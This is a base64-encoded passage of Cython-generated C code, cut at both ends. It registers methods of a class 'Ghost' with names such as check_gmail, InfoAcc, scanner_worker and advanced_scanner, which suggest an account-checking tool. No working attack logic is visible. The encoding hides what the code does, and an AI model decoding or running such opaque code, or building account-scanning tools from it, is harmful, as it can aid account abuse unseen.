VSUigwLCA3OCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NldF9hY3RpdmVfdGhyZWFkcywgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDc4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF83Z2V0X2NvdW50ZXIsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9nZXRfY291bnRlciwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbN10pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgODIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXRfY291bnRlciwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDgyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF85Y3JlYXRlX2Jhbm5lciwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X2NyZWF0ZV9iYW5uZXIsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzhdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY3JlYXRlX2Jhbm5lciwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDg2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF8xMXRsbCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X3RsbCwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOV0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgODksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGwsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA4OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogIAogIF9fcHl4X3RfNSA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfMTNjaGVja19nbWFpbCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X2NoZWNrX2dtYWlsLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTI2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hlY2tfZ21haWwsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxMjYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAKICBfX3B5eF90XzUgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydGZfNUdob3N0XzE1Y2hlY2ssIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9jaGVjaywgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE4MSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NoZWNrLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTgxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF8xN3Jlc3QsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9yZXN0LCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMl0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjI5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVzdCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogIAogIF9fcHl4X3RfNSA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfMTlkYXRlLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3RfZGF0ZSwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTNdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI3MCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGUsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAyNzAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAKICBfX3B5eF90XzUgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydGZfNUdob3N0XzIxSW5mb0FjYywgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X0luZm9BY2MsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE0XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JbmZvQWNjLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjk4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF8yM2dlbmVyYXRlX3VzZXJfaWQsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9nZW5lcmF0ZV91c2VyX2lkLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNV0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzY5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2VuZXJhdGVfdXNlcl9pZCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDM2OSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogIAogIF9fcHl4X3RfNSA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfMjVzY2FubmVyX3dvcmtlciwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X3NjYW5uZXJfd29ya2VyLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxNl0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzczLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2Nhbm5lcl93b3JrZXIsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNzMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAKICBfX3B5eF90XzUgPSBfX1B5eF9DeUZ1bmN0aW9uX05ldygmX19weXhfbWRlZl8ydGZfNUdob3N0XzI3Y3JlYXRlX2Rhc2hib2FyZCwgMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0X2NyZWF0ZV9kYXNoYm9hcmQsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE3XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MjUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jcmVhdGVfZGFzaGJvYXJkLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF8yOWFkdmFuY2VkX3NjYW5uZXIsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9hZHZhbmNlZF9zY2FubmVyLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxOF0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDM1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWR2YW5jZWRfc2Nhbm5lciwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CgogIAogIF9fcHl4X3RfNSA9IF9fUHl4X0N5RnVuY3Rpb25fTmV3KCZfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfMzFydW4sIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9ydW4sIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzE5XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0NjksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ydW4sIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0NjksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAKICBfX3B5eF90XzUgPSBfX1B5eF9QeTNDbGFzc0NyZWF0ZSgoKFB5T2JqZWN0KikmUHlUeXBlX1R5cGUpLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBfX3B5eF90XzMsIE5VTEwsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA1NSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uYW1lXzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0ODQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfMTEgPSAoX19QeXhfUHlVbmljb2RlX0VxdWFscyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9tYWluLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTEgPCAwKSkpIF9fUFlYX0VSUigwLCA0ODQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIGlmIChfX3B5eF90XzExKSB7CgogICAgCiAgICB7CiAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzgsICZfX3B5eF90XzcsICZfX3B5eF90XzEpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgICAgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0ODYsIF9fcHl4X0wxMV9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICBfX3B5eF90XzYgPSAxOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9OwogICAgICAgICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0ODYsIF9fcHl4X0wxMV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICAgIH0KICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NjYW5uZXIsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0ODYsIF9fcHl4X0wxMV9lcnJvcikKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF80ID0gTlVMTDsKICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NjYW5uZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0ODcsIF9fcHl4X0wxMV9lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ydW4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNDg3LCBfX3B5eF9MMTFfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fcHl4X3RfNiA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgTlVMTH07CiAgICAgICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgxLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDQ4NywgX19weXhfTDExX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgICAgICAKICAgICAgfQogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICBnb3RvIF9fcHl4X0wxNl90cnlfZW5kOwogICAgICBfX3B5eF9MMTFfZXJyb3I6OwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoX19weXhfYnVpbHRpbl9LZXlib2FyZEludGVycnVwdCk7CiAgICAgIGlmIChfX3B5eF90XzEyKSB7CiAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0ZiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMywgJl9fcHl4X3RfMTAsICZfX3B5eF90XzQpIDwgMCkgX19QWVhfRVJSKDAsIDQ4OCwgX19weXhfTDEzX2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEwKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfMiA9IE5VTEw7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogICAgICAgIF9fcHl4X3RfOSA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgIF9fcHl4X3RfNiA9IDE7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99OwogICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0ODksIF9fcHl4X0wxM19leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0wxMl9leGNlcHRpb25faGFuZGxlZDsKICAgICAgfQoKICAgICAgCiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICAgIGlmIChfX3B5eF90XzEyKSB7CiAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0ZiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNCwgJl9fcHl4X3RfMTAsICZfX3B5eF90XzMpIDwgMCkgX19QWVhfRVJSKDAsIDQ5MCwgX19weXhfTDEzX2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1